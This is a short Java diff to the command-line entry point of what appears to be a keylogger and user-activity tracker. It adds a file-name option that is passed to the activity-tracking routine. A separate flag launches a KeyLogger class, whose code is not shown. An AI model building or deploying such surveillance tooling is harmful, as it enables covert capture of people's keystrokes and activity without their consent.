@@ -17,6 +17,9 @@ public class Main implements Callable<String> {
     @Option(names = "-t", description = "Track the user Activity")
     private boolean track;
 
+    @Option(names = "-f", description = "FileName")
+    private String file;
+
     @Option(names = "-l", description = "Start logging Keys")
     private boolean log;
 
@@ -32,7 +35,7 @@ public class Main implements Callable<String> {
     public String call() throws Exception {
         // Place where we execute the commands defined above.
         if(track){
-            UserActivity.main();
+            UserActivity.main(file);
         }
         if(log){
             KeyLogger.main();
